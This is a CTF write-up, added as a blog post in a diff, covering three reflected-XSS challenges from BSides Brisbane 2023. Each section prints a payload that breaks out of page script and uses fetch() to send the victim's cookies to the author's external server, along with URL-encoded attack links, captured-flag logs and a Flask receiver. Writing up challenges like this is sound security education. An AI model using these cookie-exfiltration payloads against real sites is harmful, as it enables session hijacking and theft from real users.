@@ -1,0 +1,297 @@
+---
+year: 2023
+month: 07
+day: 18
+---
+# BSides Brisbane 2023 - Writeups (Part 2: web, pwn)
+
+The BSides Brisbane CTF was an exciting mix of traditional jeopardy challenges, and
+hardware/enterprise hacking. Huge props to the team who made this top quality CTF happen!
+
+In part 1 I covered all crypto and rev challenges along with an interesting IoT challenge.
+In this part I'll cover some of the web challenges and both of the pwn challenges.
+
+## Overview
+
+@TableOfContents{"depth": 1}@
+
+---
+
+## XSS Green (web - 200 points)
+
+> Can you leak the admin's cookies?
+>
+> Author: mnz
+
+We're presented with a bright green home page with a single link pointing to a form which
+we can use to send links to the admin for review. If we send a link to a site we control,
+we could run arbitrary JavaScript in the admin's browser, however, we wouldn't be able to
+access the cookie. Clearly, we need to find an XSS, and given that the site has such a
+small surface, it shouldn't be too hard. But I looked around for 15 minutes or so and
+didn't find anything. I knew that I must be missing something.
+
+Later on, Howard let me know that they had found an XSS and just couldn't figure out how
+to exploit it. It turns out, the XSS was pretty contrived and I just didn't see it because
+I was using Safari with the compact tab layout (which only displays the domain of a site
+unless you click on the URL input to see the full URL). The XSS primitive was a `js` query
+parameter which gets reflected into the site 🤦‍♂️Usually I use Firefox for CTF challenges
+but I didn't bother because it was supposedly a simple web challenge. Lesson learnt!
+
+When you visit the homepage without the `js` parameter, you get redirected to this URL:
+`https://green.web.ctf.bsidesbne.com/?js=your_input_here`. A quick inspect element
+reveals that we've been given a reflected XSS (but not quite for free).
+
+```html
+<html>
+  <script>
+    function deadcode(){
+      /*your_input_here */
+    }
+  </script>
+  <body style="background: lightgreen">
+    <h1>Green</h1>
+    <hr />
+    <a href="report.php">send link to admin</a>
+  </body>
+</html>
+```
+Figure 1: *the source of the page, notice that the value of the `js` parameter included verbatim in the script tags.*
+
+To exploit this vulnerability we need to find an input that will allow us to escape the
+comment, escape the function, and then insert code that will send the admin's cookie back
+to us. We also need to ensure that the code after our input doesn't cause a syntax error,
+that is the closing brace of the function must be matched by an opening brace in our
+input.
+
+```js
+*/}fetch("https://backend.stackotter.dev:8000/?"+document.cookie);{/*
+```
+Figure 2: *the payload I used to exfiltrate the admin's cookie.*
+
+First, I escaped the comment and the function simply by closing them, then I used `fetch`
+to send the admin's cookie to a server I control, then I used a `{` to ensure that the
+original closing brace was matched (it'll get parsed as an empty object), and finally
+I used a `/*` to ensure that the closing delimiter of the comment we escaped gets matched.
+
+```js
+function deadcode(){
+  /**/}fetch("https://backend.stackotter.dev:8000/?"+document.cookie);{/* */
+}
+
+// With some clean up, the code becomes a lot more clear.
+function deadcode() {}
+fetch("https://backend.stackotter.dev:8000/?"+document.cookie);
+{}
+```
+Figure 3: *the payloaded inserted into the original script and cleaned up to demonstrate how it works.*
+
+Putting this payload through CyberChef's `URL Encode` recipe with `Encode all special chars` enabled
+gives us the value to pass to `js` in the URL. Sending the following URL to the admin successfully
+got the admin's cookie to turn up in the logs of the server I controlled;
+https://green.web.ctf.bsidesbne.com/?js=%2A%2F%7Dfetch%28%22https%3A%2F%2Fbackend%2Estackotter%2Edev%3A8000%2F%3F%22%2Bdocument%2Ecookie%29%3B%7B%2F%2A
+
+```
+3.24.244.16 - - [23/Jul/2023 12:52:31] "GET /?flag=flag{77eeaaa231a792f0e8f2f650a12e6929} HTTP/1.1" 200 -
+```
+Figure 4: *the server logs containing the flag.*
+
+Flag: `flag{77eeaaa231a792f0e8f2f650a12e6929}`
+
+Note that I had to use an `https` web server with my payload because of CORS, but it turns out that
+by using fetch's `no-cors` mode to ignore CORS I could've used a regular `http` server. Using `no-cors`
+restricts what parts of the request we can control and what parts of the response we can read, but
+that doesn't matter in this case. Thanks OMGasm for pointing out this improvement after the CTF!
+
+I have included the simple server code that I used, it really wasn't anything fancy. If you don't
+have a server available, I've heard that you can also try [ngrok](https://ngrok.com) for these
+kinds of challenges.
+
+```python
+from flask import Flask
+from flask_cors import CORS
+
+app = Flask(__name__)
+CORS(app)
+
+@app.route("/")
+def index():
+  return "hi"
+
+# Cert generated by certbot and was already installed on the server for another website.
+app.run("0.0.0.0", 8000, ssl_content=("keyfile.pem", "privkey.pem"))
+```
+Figure 5: *the server code used to receive the flag from the admin's browser.
+
+### Conclusion
+
+The challenge was a nice simple reflected XSS, if only I'd seen the query parameter 🤦‍♂️.
+
+---
+
+## XSS Blue (web - 250 points)
+
+> Can you leak the admin's cookies?
+>
+> Author: mnz
+
+We're basically presented with the exact same site as XSS Green, expect this time it's blue!
+(and our input is injected into a slightly more annoying part of the script tag).
+
+```js
+function deadcode() {
+  var params = {};
+  params['noot'] = "your_input_here";
+  params['doot'] = 'your_input_here';
+}
+```
+Figure 6: *the script that our input gets inserted into.*
+
+To approach this problem I started out with my working payload for XSS Green and started to
+modify it. Initially I aimed to just get the payload working for the second string while
+ignoring the first string. Then, since the two strings used different quotation marks I
+could modify the payload so that it was basically a bunch of benign code when inserted into
+the first string. It's hard to explain the process I used as it was essentially just
+intuition, but the core idea is that by using the two types of quotes, the two insertion points
+will interpret different parts of the input as syntax highlighting will show you below.
+
+```js
+";';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'//
+```
+Figure 7: *my payload for XSS Blue.*
+
+```js
+function deadcode() {
+  var params = {};
+  params['noot'] = "";';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'//";
+  params['doot'] = '";';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'//';
+}
+
+// Cleaning the code up a little makes things a bit more clear
+function deadcode() {
+  var params = {};
+  params['noot'] = "";
+  ';} fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);{ //'
+  params['doot'] = '";';
+}
+fetch(`https://backend.stackotter.dev:8000/?`+document.cookie);
+{}
+```
+Figure 8: *the script after having the payload inserted into it.*
+
+As you can see from the syntax highlighting, at the first insertion site our payload is
+basically just ignored as one big string followed by a comment. In contrast, the second
+one escapes the function, sends the cookie to our server, and matches the function's
+original closing brace just as my payload for XSS Green did.
+
+URL encoding the payload (from Figure 7) and passing that as the `js` query parameter
+of the URL we send to the admin gives us the flag;
+https://blue.web.ctf.bsidesbne.com/?js=%22%3B%27%3B%7D%20fetch%28%60https%3A%2F%2Fbackend.stackotter.dev%3A8000%2F%3F%60%2Bdocument.cookie%29%3B%7B%20%2F%2F%27%2F%2F
+
+```
+3.24.244.16 - - [23/Jul/2023 13:29:40] "GET /?flag=flag{e7eaae85f7c752303c9d4520a06ccc39} HTTP/1.1" 200 -
+```
+Figure 9: *the line of the server logs containing the flag.*
+
+Flag: `flag{e7eaae85f7c752303c9d4520a06ccc39}`
+
+The solution could've been improved in the same ways as XSS Green, but overall I think it was
+probably pretty close to the intended solution.
+
+---
+
+## XSS Orange (web - 350 points)
+
+> Can you leak the admin's cookies?
+>
+> Author: mnz
+
+Again this challenge was pretty similar to XSS Blue and XSS Green in nature, except this
+time the website was orange! (surprise)
+
+The main twist this time was that there were now blocked keywords (such as `window` and `function`).
+Also, our input now gets put in 3 spots.
+
+```js
+function deadcode(your_input_here) {
+  if (your_input_here) {
+    var params = {};
+    params['noot'] = "your_input_here";
+    return params;
+  }
+}
+```
+Figure 10: *the script that our input gets inserted into.*
+
+I'll try my best to explain the rough thought process I followed (as much of it as I can
+remember), but honestly these kinds of challenges are mostly just intuition with trial and error
+for me so it's pretty hard to give solid advice on how to solve them.
+
+The first thing to notice is that the third location (the double quoted string) is the odd
+one out and we can easily just ignore it by not using newlines or double quotes. This
+simplifies things a bit. Next, we can see that the biggest challenge is that the first
+insertion point has to end up looking like a function parameter list (which is quite a
+bit stricter than the if condition insertion point). Because of that observation, I started
+my payload with `x)` to make that valid and immediately escape it. Next I provided a function
+body that sends the cookie to our server, and after the function body I call `deadcode`. Now
+we just need to make sure that the payload cleanly matches up all of the closing delimiters
+of the things that it escaped. Because the `function` keyword is blocked we can't simply use
+`function (` to match `) {`, but luckily we can just use a comment to ignore the `) {` immediately
+after our input and then use `() => {` to match the original closing brace of the function.
+We can't just use `{` because there's an if statement between the braces, which wouldn't be
+valid as part of an object literal. With a few tweaks it's not too difficult to ensure that
+the payload quietly works at the if statement insertion point too (it doesn't actually get
+run so it just needs to be syntactically valid).
+
+```js
+x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () => {//
+```
+Figure 11: *the final payload.*
+
+```js
+function deadcode(x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () => {//) {
+  if (x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () => {//) {
+    var params = {};
+    params['noot'] = "x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () => {//";
+    return params;
+  }
+}
+
+// Cleaning the code up a little makes things a bit more clear
+function deadcode(x) {
+  fetch('https://backend.stackotter.dev:8000/?'+document.cookie)
+};
+deadcode();
+var y = () => {
+  if (x) {
+    fetch('https://backend.stackotter.dev:8000/?'+document.cookie)
+  };
+  deadcode();
+  var y = () => {
+    var params = {};
+    params['noot'] = "x) {fetch('https://backend.stackotter.dev:8000/?'+document.cookie)}; deadcode(); var y = () => {//";
+    return params;
+  }
+}
+```
+Figure 12: *the script after having the payload inserted into it.*
+
+Luckily JavaScript is very relaxed, because otherwise we might've had to work a bit
+more to get this payload working 😅.
+
+```
+3.24.244.16 - - [23/Jul/2023 13:36:41] "GET /?flag=flag{ed8a00ce2b82a9028a5d06ebbefb26582c0c98fc} HTTP/1.1" 200 -
+```
+Figure 13: *the line of the server logs containing the flag.*
+
+Flag: `flag{ed8a00ce2b82a9028a5d06ebbefb26582c0c98fc}`
+
+### Conclusion
+
+This challenge was pretty interesting to solve and was a nice follow on challenge from
+the previous two XSS challenges that I had solved. However, the fact that the web
+category had two of these lucrative 'challenge series's meant that the pwn challenges
+didn't have much value in terms of points. I spent an hour-ish total to solve the three
+of the XSS challenges for 800 points, but spent multiple hours on `protec` (a pwn challenge
+that didn't get a second solve right until the end) for just 350 points. The CTF devs
+did a great job with the CTF, but I think the scoring could do with some tuning next
+year.
